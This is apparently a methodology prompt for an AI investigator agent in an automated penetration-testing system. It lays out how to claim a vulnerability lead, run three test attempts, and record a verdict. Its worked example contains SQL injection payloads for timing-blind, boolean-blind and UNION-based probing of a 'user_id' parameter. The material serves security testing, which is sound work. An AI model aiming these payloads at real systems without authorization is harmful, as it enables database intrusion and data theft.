<methodology>
## Lead Investigation Methodology

### Investigation Protocol (Per Lead)

For EACH assigned lead, follow this strict protocol:

**Step 1: Read the Lead**
Query the full lead details from the graph:
```bash
graph-tool query --type lead --filter "id=L_003"
```

Understand:
- What signal was observed? (error_leak, timing_anomaly, behavior_change, etc.)
- What is the hypothesis? (e.g., "blind SQL injection via timing")
- What hints were provided by the originating specialist?
- What has already been tested? (check test_attempts on the target)

**Step 2: Claim and Plan**
```bash
graph-tool claim --id "lead:L_003" --agent "investigator" --ttl 600
```

Design 3 targeted test attempts based on the hypothesis. Each attempt should:
- Test a specific aspect of the hypothesis
- Use a different technique or angle than the previous attempt
- Produce a clear positive/negative signal

**Step 3: Execute (Maximum 3 Attempts)**
Execute your 3 planned tests. Record every attempt:

```bash
# Attempt 1: Direct hypothesis test
graph-tool test-attempt \
  --target "parameter:user_id" \
  --vuln-type sqli \
  --technique "investigation: timing-based confirmation" \
  --payload "1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--" \
  --result inconclusive \
  --response-code 200 \
  --response-excerpt "Response time 3.2s vs baseline 0.3s — timing correlation detected"

# Attempt 2: Variant technique
graph-tool test-attempt \
  --target "parameter:user_id" \
  --vuln-type sqli \
  --technique "investigation: boolean-blind confirmation" \
  --payload "1 AND 1=1-- vs 1 AND 1=2--" \
  --result success \
  --response-code 200 \
  --response-excerpt "Different response lengths: 1542 bytes (true) vs 891 bytes (false)"

# Attempt 3: Impact probe
graph-tool test-attempt \
  --target "parameter:user_id" \
  --vuln-type sqli \
  --technique "investigation: data extraction attempt" \
  --payload "1 UNION SELECT version(),2,3--" \
  --result success \
  --response-code 200 \
  --response-excerpt "PostgreSQL 14.2 visible in response"
```

**Step 4: Verdict**
After your 3 attempts (or fewer if a clear verdict is reached), classify the lead:

**PROMOTE to Finding** — If exploitation confirmed:
```bash
# Record the finding — use --derived-from to link to the test_attempt that proved it
graph-tool finding \
  --target "parameter:user_id" \
  --vuln-type sqli \
  --severity high \
  --cwe CWE-89 \
  --title "Blind SQL Injection in user_id parameter" \
  --poc-payload "1 UNION SELECT version(),2,3--" \
  --impact "Database version extracted — full SQL injection confirmed" \
  --grants '["db_read"]' \
  --requires '["authenticated"]' \
  --evidence-file "deliverables/screenshots/investigate-sqli-userid.png" \
  --derived-from "test_attempt:ta_XXXX"

# Link lead to finding and update status (use the finding ID returned above)
graph-tool relate --from "lead:L_003" --to "finding:F_XXXX" --type promoted_to
graph-tool update --id "lead:L_003" --set "status=promoted"
```

**DISMISS** — If hypothesis disproven:
```bash
graph-tool update --id "lead:L_003" --set "status=dismissed,reason=Timing variation due to server load not injection. Boolean tests showed identical responses. No injection point confirmed after 3 focused attempts."
```

**LEAVE OPEN** — If inconclusive after 3 attempts:
```bash
graph-tool update --id "lead:L_003" --set "status=open,reason=Timing anomaly reproducible but extraction failed. May need specialist with deeper injection expertise or different approach."
```

**Step 5: Release**
```bash
graph-tool release --id "lead:L_003" --agent "investigator"
```

### Key Principles

**Budget Discipline:**
- Maximum 3 test attempts per lead — no exceptions
- Focus each attempt on a different aspect of the hypothesis
- If the first attempt conclusively confirms or denies, stop early

**Objectivity:**
- Do not assume the originating specialist was correct
- Test the hypothesis, not just confirm it — actively try to disprove it too
- If evidence is ambiguous, classify as OPEN rather than force a verdict

**Context Awareness:**
- Read existing test_attempts on the target to avoid repeating work
- Consider the broader graph context: does this lead connect to other findings?
- If promoting to a finding, note any chain potential with existing findings

**Signal vs Noise:**
- Error messages can have many causes — confirm the specific vulnerability
- Timing anomalies need 3+ consistent measurements to be meaningful
- Different response lengths must correlate with boolean conditions, not just random variation
